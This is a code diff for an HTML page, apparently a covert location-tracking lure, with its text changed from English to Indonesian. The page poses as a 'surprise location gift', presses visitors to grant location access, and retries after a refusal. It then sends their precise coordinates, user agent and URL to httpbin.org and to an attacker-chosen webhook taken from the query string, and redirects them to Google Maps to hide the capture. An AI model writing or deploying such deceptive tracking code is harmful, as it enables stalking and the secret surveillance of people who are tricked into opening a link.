@@ -1,135 +1,246 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>X-TOS Tracker</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>X-TOS Location Tracker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#667eea">
     <style>
+        * { box-sizing: border-box; }
         body { 
-            font-family: Arial; text-align: center; padding: 20px; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            text-align: center; padding: 10px; margin: 0;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white; min-height: 100vh; margin: 0;
+            color: white; min-height: 100vh; overflow-x: hidden;
         }
-        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
+        .container { 
+            max-width: 420px; margin: 0 auto; padding: 15px;
+            width: 100%; min-height: 100vh; display: flex;
+            flex-direction: column; justify-content: center;
+        }
         .gift-box { 
-            background: rgba(255,255,255,0.1); 
-            border-radius: 15px; padding: 30px; margin: 20px 0;
-            backdrop-filter: blur(10px);
+            background: rgba(255,255,255,0.15); 
+            border-radius: 20px; padding: 25px; margin: 15px 0;
+            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
         }
-        .gift-icon { font-size: 60px; margin-bottom: 20px; }
+        .gift-icon { 
+            font-size: clamp(50px, 15vw, 70px); 
+            margin-bottom: 15px; animation: bounce 2s infinite;
+        }
         .status { 
-            padding: 15px; border-radius: 10px; margin: 20px 0;
-            background: rgba(255,255,255,0.2);
+            padding: 18px; border-radius: 15px; margin: 15px 0;
+            background: rgba(255,255,255,0.25); font-weight: 500;
+            border: 1px solid rgba(255,255,255,0.3);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
         }
         .loading { animation: pulse 2s infinite; }
         .instruction {
-            background: rgba(0,255,0,0.2); 
-            border-radius: 10px; padding: 15px; margin: 20px 0;
-            border: 2px solid #00ff00;
+            background: rgba(76,175,80,0.3); 
+            border-radius: 15px; padding: 18px; margin: 15px 0;
+            border: 2px solid #4CAF50; font-weight: 500;
         }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        h2 { color: #ffeb3b; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .coords-display {
+            background: rgba(33,150,243,0.3);
+            border-radius: 15px; padding: 15px; margin: 15px 0;
+            border: 2px solid #2196F3; font-family: monospace;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+                           40% { transform: translateY(-10px); }
+                           60% { transform: translateY(-5px); } }
+        h1 { 
+            color: #ffeb3b; text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
+            font-size: clamp(1.5rem, 6vw, 2rem); margin: 10px 0;
+        }
+        p { font-size: clamp(14px, 4vw, 16px); line-height: 1.5; margin: 10px 0; }
+        .btn {
+            background: #4CAF50; color: white; border: none;
+            padding: 15px 30px; border-radius: 25px; font-size: 16px;
+            cursor: pointer; margin: 10px; transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(76,175,80,0.4);
+        }
+        .btn:hover { background: #45a049; transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+        @media (max-width: 480px) {
+            .container { padding: 10px; }
+            .gift-box, .status, .instruction { padding: 15px; margin: 10px 0; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🎁 SURPRISE LOCATION GIFT!</h2>
+        <h1>🎁 HADIAH LOKASI SPESIAL!</h1>
         <div class="gift-box">
             <div class="gift-icon">🎁</div>
-            <p>Someone sent you a special location!</p>
-            <p><strong>Click ALLOW to see the surprise 😊</strong></p>
+            <p>Seseorang mengirim lokasi spesial untukmu!</p>
+            <p><strong>Klik IZINKAN untuk melihat kejutan 😊</strong></p>
         </div>
-        <div id="status" class="status loading">📡 Waiting for your permission...</div>
-        <div id="coords"></div>
+        <div id="status" class="status loading">📡 Menunggu izin lokasi...</div>
+        <div id="coords" class="coords-display" style="display:none;"></div>
         <div class="instruction">
-            <p>⬇️ When browser asks for location:</p>
-            <p><strong>🟢 Click "ALLOW" or "IZINKAN"</strong></p>
+            <p>⬇️ Saat browser minta izin lokasi:</p>
+            <p><strong>🟢 Klik "IZINKAN" atau "ALLOW"</strong></p>
+            <button class="btn" onclick="requestLocation()" id="manualBtn" style="display:none;">📍 Minta Izin Lokasi</button>
         </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const webhookUrl = urlParams.get('webhook') || '';
+        let retryCount = 0;
+        const maxRetries = 3;
         
-        // Show instruction immediately
-        document.getElementById('status').innerHTML = '📡 Please allow location access when prompted!';
+        function updateStatus(msg, isError = false) {
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML = msg;
+            statusEl.className = isError ? 'status' : 'status loading';
+        }
         
-        if (navigator.geolocation) {
-            // Request location with high accuracy
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
+        function sendLocationData(locationData) {
+            const promises = [];
+            
+            // Method 1: httpbin untuk testing
+            promises.push(
+                fetch('https://httpbin.org/post', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(locationData)
+                }).catch(e => console.log('Httpbin error:', e))
+            );
+            
+            // Method 2: webhook jika ada
+            if (webhookUrl) {
+                promises.push(
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    }).catch(e => console.log('Webhook error:', e))
+                );
+            }
+            
+            // Method 3: GET request dengan parameter
+            const img = new Image();
+            img.src = `https://httpbin.org/get?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}`;
+            
+            // Method 4: localStorage untuk testing lokal
+            localStorage.setItem('xtos_location', JSON.stringify(locationData));
+            
+            return Promise.allSettled(promises);
+        }
+        
+        function handleLocationSuccess(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = Math.round(position.coords.accuracy);
+            
+            updateStatus('✅ Lokasi berhasil didapat!');
+            
+            const coordsEl = document.getElementById('coords');
+            coordsEl.style.display = 'block';
+            coordsEl.innerHTML = 
+                `📍 <strong>Koordinat:</strong><br>${lat.toFixed(6)}, ${lng.toFixed(6)}<br>` +
+                `📏 <strong>Akurasi:</strong> ${accuracy}m<br>` +
+                `⏰ <strong>Waktu:</strong> ${new Date().toLocaleTimeString('id-ID')}`;
+            
+            const locationData = {
+                latitude: lat,
+                longitude: lng,
+                accuracy: accuracy,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent.substring(0, 100),
+                url: window.location.href
+            };
+            
+            console.log('LOKASI TERTANGKAP:', locationData);
+            
+            // Kirim data ke multiple endpoints
+            sendLocationData(locationData).then(() => {
+                updateStatus('📤 Data lokasi terkirim!');
                 
-                document.getElementById('status').innerHTML = '✅ Location captured';
-                document.getElementById('coords').innerHTML = 
-                    `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>📏 Accuracy: ${accuracy}m`;
-                
-                // Save location to localStorage and try to send via webhook
-                const locationData = {
-                    latitude: lat,
-                    longitude: lng,
-                    accuracy: accuracy,
-                    timestamp: Date.now()
-                };
-                
-                // Save locally
-                localStorage.setItem('xtos_location', JSON.stringify(locationData));
-                
-                // Try to send via webhook URL with JSONP-like approach
-                if (webhookUrl) {
-                    const script = document.createElement('script');
-                    script.src = `${webhookUrl}?callback=xtos&lat=${lat}&lng=${lng}&acc=${accuracy}&t=${Date.now()}`;
-                    document.head.appendChild(script);
-                    
-                    // Also try image pixel tracking
-                    const img = new Image();
-                    img.src = `https://httpbin.org/get?lat=${lat}&lng=${lng}&t=${Date.now()}`;
-                }
-                
-                // Show success and redirect
                 setTimeout(() => {
-                    document.getElementById('status').innerHTML = '🚀 Redirecting to maps...';
+                    updateStatus('🚀 Mengarahkan ke Google Maps...');
                     setTimeout(() => {
-                        window.location.href = `https://maps.google.com/?q=${lat},${lng}`;
-                    }, 1000);
+                        window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
+                    }, 1500);
                 }, 2000);
-                
-            }, function(error) {
-                let errorMsg = '';
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorMsg = '❌ You denied location access. Please refresh and click ALLOW!';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        errorMsg = '❌ Location not available. Please enable GPS!';
-                        break;
-                    case error.TIMEOUT:
-                        errorMsg = '❌ Location request timeout. Trying again...';
-                        // Retry after timeout
-                        setTimeout(() => {
-                            window.location.reload();
-                        }, 3000);
-                        break;
-                }
-                
-                document.getElementById('status').innerHTML = errorMsg;
+            });
+        }
+        
+        function handleLocationError(error) {
+            let errorMsg = '';
+            let showRetry = false;
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMsg = '❌ Izin lokasi ditolak. Silakan refresh dan klik IZINKAN!';
+                    showRetry = true;
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMsg = '❌ Lokasi tidak tersedia. Pastikan GPS aktif!';
+                    showRetry = true;
+                    break;
+                case error.TIMEOUT:
+                    errorMsg = '⏱️ Timeout. Mencoba lagi...';
+                    if (retryCount < maxRetries) {
+                        retryCount++;
+                        setTimeout(requestLocation, 2000);
+                        return;
+                    }
+                    showRetry = true;
+                    break;
+            }
+            
+            updateStatus(errorMsg, true);
+            
+            if (showRetry) {
+                document.getElementById('manualBtn').style.display = 'inline-block';
+                document.getElementById('coords').style.display = 'block';
                 document.getElementById('coords').innerHTML = 
-                    '<p><strong>How to fix:</strong></p>' +
-                    '<p>1. Refresh this page</p>' +
-                    '<p>2. Click ALLOW when asked</p>' +
-                    '<p>3. Enable GPS/Location on your phone</p>';
+                    '<p><strong>Cara mengatasi:</strong></p>' +
+                    '<p>1. Refresh halaman ini</p>' +
+                    '<p>2. Klik IZINKAN saat diminta</p>' +
+                    '<p>3. Aktifkan GPS/Lokasi di HP</p>' +
+                    '<p>4. Gunakan browser Chrome/Safari</p>';
                 
                 setTimeout(() => {
                     window.location.href = 'https://maps.google.com/';
-                }, 5000);
-            }, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        } else {
-            document.getElementById('status').innerHTML = '❌ Geolocation not supported';
+                }, 8000);
+            }
         }
+        
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                updateStatus('❌ Browser tidak mendukung geolocation', true);
+                return;
+            }
+            
+            updateStatus('📡 Meminta izin lokasi...');
+            document.getElementById('manualBtn').style.display = 'none';
+            
+            navigator.geolocation.getCurrentPosition(
+                handleLocationSuccess,
+                handleLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        // Auto-start saat halaman load
+        window.addEventListener('load', () => {
+            setTimeout(requestLocation, 1000);
+        });
+        
+        // Handle visibility change untuk retry
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && retryCount < maxRetries) {
+                setTimeout(requestLocation, 500);
+            }
+        });
     </script>
 </body>
 </html>
